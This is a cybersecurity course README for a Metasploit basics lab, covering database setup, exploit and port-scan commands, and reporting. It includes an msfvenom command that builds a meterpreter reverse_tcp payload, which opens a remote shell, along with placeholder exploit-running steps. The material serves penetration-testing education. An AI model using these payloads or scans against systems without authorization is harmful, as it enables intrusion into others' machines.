# 0x03. Metasploit Basics

## Description

This project provides a comprehensive guide to setting up and using Metasploit Framework. It covers installation with PostgreSQL, basic usage, payload creation, exploration of auxiliary modules, and documentation of findings.

**Important Note:** Please use the `notes` and `loot` commands starting from Part 2. Dump the data and upload it along with the script for all tasks using:
```bash
loot -t csv
```

## Learning Objectives

By the end of this project, you should be able to:
- Set up Metasploit with PostgreSQL for efficient data management
- Use basic Metasploit commands for vulnerability exploitation
- Create and deploy custom payloads using msfvenom
- Explore and utilize auxiliary modules for penetration testing tasks
- Document findings and generate reports from Metasploit sessions

## Requirements

- Ubuntu system
- PostgreSQL database
- Metasploit Framework
- Basic knowledge of penetration testing concepts
- Understanding of network protocols and services

## Project Structure

```
0x03_metasploit_basics/
├── README.md
├── metasploit_workflow.sh
├── notes.csv
└── payload.elf
```

## Tasks

### Part 1: Setup Metasploit Locally with PostgreSQL

Set up Metasploit with PostgreSQL to manage data efficiently.

**Steps:**
1. **Install PostgreSQL:** Install PostgreSQL and its dependencies on your Ubuntu system
2. **Start PostgreSQL Service:** Start the PostgreSQL service to ensure the database is operational
3. **Create PostgreSQL User:** Create a dedicated PostgreSQL user specifically for Metasploit
4. **Create PostgreSQL Database:** Set up a PostgreSQL database that Metasploit will use to store its data
5. **Initialize Metasploit Database:** Initialize the Metasploit database to prepare it for use
6. **Verify Database Connection:** Start the Metasploit console and verify the connection to the PostgreSQL database

### Part 2: Basic Usage of Metasploit

Familiarize yourself with basic commands in Metasploit for exploiting vulnerabilities.

**Steps:**
1. **Start the Metasploit Console:** Access the Metasploit console to begin interacting with its features
2. **Search for Exploits:** Learn how to search for available exploits within Metasploit's extensive database
3. **Select an Exploit:** Choose a specific exploit from the search results to prepare for exploitation
4. **Set Exploit Options:** Configure the necessary options for the selected exploit before execution
5. **Set Payload:** Define the payload that will be delivered to the target system during exploitation
6. **Set Local Host and Port:** Specify the local host and port where Metasploit will listen for incoming connections
7. **Run the Exploit:** Execute the configured exploit to attempt exploitation on the target system

**Remember:** Use `notes` and `loot` commands to document your findings!

### Part 3: Create and Use a Simple Payload

Understand how to create and deploy a payload using Metasploit.

**Steps:**
1. **Generate a Payload:** Use Metasploit's `msfvenom` tool to create a custom payload with specific characteristics
2. **Payload Specifications:** Specify parameters such as:
   - Payload type
   - Local host (LHOST)
   - Local port (LPORT)
   - Output format
   - Output file name: `payload.elf`
3. **Execute the Payload:** Validate the generated payload and understand how it can be executed on Ubuntu systems

**Example:**
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f elf -o payload.elf
```

### Part 4: Explore Auxiliary Modules

Learn about auxiliary modules in Metasploit for performing additional tasks during penetration testing.

**Steps:**
1. **Start the Metasploit Console:** Access the Metasploit console to begin exploring auxiliary modules
2. **Search for Auxiliary Modules:** Discover and explore available auxiliary modules designed for various tasks
3. **Select an Auxiliary Module:** Choose a specific auxiliary module (e.g., `auxiliary/scanner/portscan/tcp`) for scanning purposes
4. **Configure Module Options:** Set the required options for the selected auxiliary module, such as specifying the target hosts (RHOSTS)
5. **Execute the Module:** Run the configured auxiliary module to perform its designated task, such as conducting a TCP port scan

**Example Module:** `auxiliary/scanner/portscan/tcp`

### Part 5: Documentation and Reporting

Learn how to document findings and generate reports from Metasploit sessions.

**Steps:**
1. **Documentation of Activities:** Document all actions performed during Metasploit sessions, including commands executed and their respective outputs
2. **Using the Notes Command:** Utilize Metasploit's `notes` command to store detailed findings and notes during penetration testing activities
3. **Using the Loot Command:** Employ Metasploit's `loot` command to collect and store valuable data obtained during penetration testing sessions
4. **Generate Reports:** Compile documented findings and collected data into comprehensive reports

**Export Data:**
```bash
loot -t csv
```

This command will export all collected loot in CSV format for documentation and reporting purposes.

## Files Description

| File | Description |
|------|-------------|
| `metasploit_workflow.sh` | Bash script containing the complete Metasploit setup and usage workflow |
| `notes.csv` | CSV file containing documented findings using Metasploit's notes command |
| `payload.elf` | Generated ELF payload file created using msfvenom |

## Usage

### Setting Up Metasploit

```bash
# Install PostgreSQL
sudo apt update
sudo apt install postgresql postgresql-contrib

# Start PostgreSQL service
sudo systemctl start postgresql
sudo systemctl enable postgresql

# Initialize Metasploit database
sudo msfdb init

# Start Metasploit console
msfconsole

# Verify database connection
msf6 > db_status
```

### Basic Metasploit Commands

```bash
# Search for exploits
msf6 > search <keyword>

# Use a specific exploit
msf6 > use <exploit_path>

# Show options
msf6 > show options

# Set target
msf6 > set RHOSTS <target_ip>

# Set payload
msf6 > set PAYLOAD <payload_name>

# Run exploit
msf6 > exploit
```

### Documentation Commands

```bash
# Add notes
msf6 > notes -a <address> -t <type> -d "<data>"

# View notes
msf6 > notes

# Export loot
msf6 > loot -t csv
```

## Security and Legal Notice

**WARNING:** This project is for educational purposes only. Always ensure you have proper authorization before conducting any penetration testing activities. Unauthorized access to computer systems is illegal.

- Only test on systems you own or have explicit written permission to test
- Follow all applicable laws and regulations
- Use this knowledge responsibly and ethically
- Document all activities for legal compliance

## Resources

- [Metasploit Framework Documentation](https://docs.metasploit.com/)
- [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/)
- [PostgreSQL Documentation](https://www.postgresql.org/docs/)

## Repository

**GitHub repository:** `holbertonschool-cyber_security`
**Directory:** `vulnerability_research_exploitation/0x03_metasploit_basics`
**Files:**
- `metasploit_workflow.sh`
- `notes.csv`
- `payload.elf`

## Author

Holberton School - Cybersecurity Specialization

---

**Note:** Remember to use `loot -t csv` command to export your findings throughout the project!
